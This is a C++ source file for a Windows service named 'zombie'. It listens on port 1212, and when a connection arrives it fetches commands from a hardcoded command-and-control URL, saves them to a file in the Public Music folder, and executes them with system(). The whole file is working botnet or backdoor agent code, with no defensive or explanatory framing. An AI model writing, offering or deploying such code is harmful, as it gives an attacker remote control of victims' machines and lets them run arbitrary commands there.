#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

#define SERVICE_NAME "zombie"

std::string GetURLContent(const char* url) {
    std::string content;
    HINTERNET hInternet = InternetOpenA("MyApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    
    if (hInternet) {
        HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        
        if (hConnect) {
            DWORD bytesRead;
            char buffer[4096];
            
            while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                content.append(buffer, bytesRead);
            }
            
            InternetCloseHandle(hConnect);
        }
        
        InternetCloseHandle(hInternet);
    }
    
    return content;
}

DWORD WINAPI RequestHandler(LPVOID lpParam) {
    SOCKET clientSocket = (SOCKET)lpParam;

    char buffer[4096];
    int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);

    if (bytesRead > 0) {
        const char* url = "http://10.231.221.222/C2WebServer/controller/sendCommand.php";
        std::string urlContent = GetURLContent(url);
        std::ofstream file("C:\\Users\\Public\\Music\\command.txt");
        file << urlContent;
        file.close();
        system(GetURLContent(url).c_str());
    }

    closesocket(clientSocket);
    return 0;  // Return a DWORD value
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = htonl(INADDR_ANY);
    service.sin_port = htons(1212);

    if (bind(listenSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
        closesocket(listenSocket);
        WSACleanup();
        return;
    }

    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(listenSocket);
        WSACleanup();
        return;
    }

    while (true) {
        SOCKET clientSocket = accept(listenSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            continue;
        }

        DWORD threadId;
        HANDLE threadHandle = CreateThread(NULL, 0, RequestHandler, (LPVOID)clientSocket, 0, &threadId);
        if (threadHandle == NULL) {
            closesocket(clientSocket);
            continue;
        }

        CloseHandle(threadHandle);
    }

    closesocket(listenSocket);
    WSACleanup();
}

int main(int argc, char* argv[]) {
    SERVICE_TABLE_ENTRY serviceTable[] =
    {
        { (LPSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { nullptr, nullptr }
    };

    StartServiceCtrlDispatcher(serviceTable);
    return 0;
}